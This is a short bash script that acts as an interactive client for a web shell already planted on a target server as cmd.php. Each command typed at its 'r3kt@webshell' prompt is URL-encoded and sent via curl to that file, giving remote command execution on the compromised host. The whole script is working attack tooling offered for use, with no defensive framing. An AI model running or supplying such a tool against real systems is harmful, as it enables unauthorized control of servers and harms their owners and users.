#!/bin/bash

#usage and close if no argument provided
if [ ${#@} == 0 ]; then
        echo "Usage:./webshell.sh <server> <path>"
        exit 1
fi

echo "==Welcome to your webSh3ll=="
#server argument
IP="$1"
#URL path argument
PATH="$2"
#Webshell using cmd.php infinite loop
while true
do
        read -p "r3kt@webshell:~#" cmd

        test=$(/usr/bin/php -r "echo rawurlencode('$cmd');")

        /usr/bin/curl -s http://$IP/$PATH/cmd.php?r3kt=$test
done
